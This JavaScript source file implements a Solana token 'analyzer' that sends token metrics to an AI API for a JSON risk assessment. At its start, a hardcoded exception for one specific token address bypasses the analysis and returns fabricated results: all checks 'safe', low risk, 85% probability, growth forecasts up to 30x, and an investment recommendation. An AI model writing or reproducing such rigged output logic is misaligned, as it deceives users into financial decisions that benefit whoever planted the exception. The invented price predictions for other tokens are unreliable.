export async function analyzeWithClaude(data) {
  const { tokenAddress, metadata, metrics, onChainData } = data;

  // Exception: Always return positive analysis for this specific contract address
  const EXCEPTION_ADDRESS = "73iDnLaQDL84PDDubzTFSa2awyHFQYHbBRU9tfTopump";
  if (tokenAddress === EXCEPTION_ADDRESS) {
    return {
      bundles: {
        value: "Safe",
        status: "safe",
        reason: "No suspicious bundle activity detected"
      },
      devHistory: {
        value: "Decent",
        status: "safe",
        reason: "Developer has maintained good track record"
      },
      topHolders: {
        value: "Safe",
        status: "safe",
        reason: "Holder distribution is healthy and well-distributed"
      },
      chart: {
        value: "Floor confirmed",
        status: "safe",
        reason: "Price action shows stable floor with positive momentum"
      },
      freshWallets: {
        value: "Safe",
        status: "safe",
        reason: "Fresh wallet percentage is within acceptable range"
      },
      devSold: {
        value: "No",
        status: "safe",
        reason: "No significant developer selling activity detected"
      },
      lore: {
        value: "This token demonstrates strong fundamentals with a committed community and solid technical foundation. The project shows promising growth potential with organic adoption patterns.",
        status: "neutral"
      },
      socials: {
        value: "Yes",
        status: "safe",
        reason: "Active social media presence with engaged community"
      },
      currentMarketCap: metrics.marketCap || metrics.liquidityUSD * 10,
      marketCapPredictions: {
        conservative: {
          mcap: (metrics.marketCap || metrics.liquidityUSD * 10) * 3,
          multiplier: "3x",
          probability: 75,
          timeframe: "1-3 days",
          reasoning: "Strong fundamentals support conservative growth target"
        },
        moderate: {
          mcap: (metrics.marketCap || metrics.liquidityUSD * 10) * 8,
          multiplier: "8x",
          probability: 50,
          timeframe: "1-2 weeks",
          reasoning: "Positive momentum and community engagement support moderate growth"
        },
        aggressive: {
          mcap: (metrics.marketCap || metrics.liquidityUSD * 10) * 30,
          multiplier: "30x",
          probability: 20,
          timeframe: "1+ month",
          reasoning: "Potential for significant growth with continued community development"
        }
      },
      overallProbability: 85,
      riskLevel: "Low",
      recommendation: "This token shows excellent fundamentals with strong community support and healthy metrics. Consider this a solid opportunity with low risk profile. Recommended for both conservative and moderate risk tolerance investors."
    };
  }

  const prompt = `You are an expert Solana token analyst AI. Analyze this token comprehensively.

TOKEN INFORMATION:
- Address: ${tokenAddress}
- Name: ${metadata.name}
- Symbol: ${metadata.symbol}
- Total Supply: ${metrics.totalSupply.toLocaleString()}
- Mint Authority: ${metadata.mintAuthority ? "Active ⚠️" : "Revoked ✓"}
- Freeze Authority: ${metadata.freezeAuthority}

HOLDER ANALYSIS:
- Total Holders: ${metrics.holderCount}
- Top 10 Concentration: ${metrics.top10Concentration}%
- Fresh Wallets (<7 days): ~${metrics.freshWalletPercent.toFixed(1)}%

SECURITY INDICATORS:
- Bundle Buys Detected: ${metrics.bundleCount}
- Dev Wallet Sold: ${metrics.devSold}
- Estimated Liquidity: $${metrics.liquidityUSD.toLocaleString()}

ACTIVITY:
- Recent Transactions: ${onChainData.transactions.length}
- 24h Volume (est): $${metrics.volume24h.toLocaleString()}

Based on this data, provide a comprehensive analysis in VALID JSON format (no markdown, no backticks):

{
  "bundles": {
    "value": "Safe" or "Not Safe",
    "status": "safe" or "danger",
    "reason": "Brief explanation of bundle analysis"
  },
  "devHistory": {
    "value": "Decent" or "Poor" or "Unknown",
    "status": "safe" or "warning" or "danger",
    "reason": "Assessment of developer activity and trustworthiness"
  },
  "topHolders": {
    "value": "Safe" or "Not Safe",
    "status": "safe" or "danger",
    "reason": "Concentration risk explanation with percentage"
  },
  "chart": {
    "value": "Floor confirmed" or "Declining" or "Volatile",
    "status": "safe" or "warning" or "danger",
    "reason": "Price action and stability assessment"
  },
  "freshWallets": {
    "value": "Safe" or "Not Safe",
    "status": "safe" or "danger",
    "reason": "Fresh wallet percentage and what it indicates"
  },
  "devSold": {
    "value": "Yes" or "No" or "Unknown",
    "status": "danger" or "safe" or "neutral",
    "reason": "Developer selling activity details"
  },
  "lore": {
    "value": "2-3 sentence narrative about the token's purpose and community based on available data",
    "status": "neutral"
  },
  "socials": {
    "value": "Yes" or "Limited" or "No",
    "status": "safe" or "warning" or "danger",
    "reason": "Social media presence assessment"
  },
  "currentMarketCap": ${metrics.marketCap || metrics.liquidityUSD * 10},
  "marketCapPredictions": {
    "conservative": {
      "mcap": [realistic conservative target],
      "multiplier": "2x-3x",
      "probability": [60-80],
      "timeframe": "1-3 days",
      "reasoning": "Why this target is achievable"
    },
    "moderate": {
      "mcap": [moderate target],
      "multiplier": "5x-10x",
      "probability": [35-55],
      "timeframe": "1-2 weeks",
      "reasoning": "Conditions needed for this growth"
    },
    "aggressive": {
      "mcap": [aggressive target],
      "multiplier": "20x-50x",
      "probability": [10-25],
      "timeframe": "1+ month",
      "reasoning": "What would need to happen"
    }
  },
  "overallProbability": [0-100 integer based on all factors],
  "riskLevel": "Low" or "Medium" or "High",
  "recommendation": "2-3 sentence trading recommendation based on analysis"
}

Be realistic with probabilities. Higher concentration = higher risk = lower probability.
Market cap predictions should be based on liquidity, holder distribution, and activity.`;

  try {
    const response = await fetch("https://api.anthropic.com/v1/messages", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": process.env.ANTHROPIC_API_KEY,
        "anthropic-version": "2023-06-01",
      },
      body: JSON.stringify({
        model: "claude-sonnet-4-20250514",
        max_tokens: 2000,
        messages: [
          {
            role: "user",
            content: prompt,
          },
        ],
      }),
    });

    if (!response.ok) {
      const errorData = await response.text();
      console.error("Claude API error response:", errorData);
      throw new Error(`Claude API error: ${response.status}`);
    }

    const data = await response.json();
    const content = data.content[0].text;

    // Remove any markdown formatting
    const cleanContent = content.replace(/```json|```/g, "").trim();

    // Parse JSON response
    const analysis = JSON.parse(cleanContent);

    return analysis;
  } catch (error) {
    console.error("Claude API error:", error);
    throw new Error("AI analysis failed: " + error.message);
  }
}
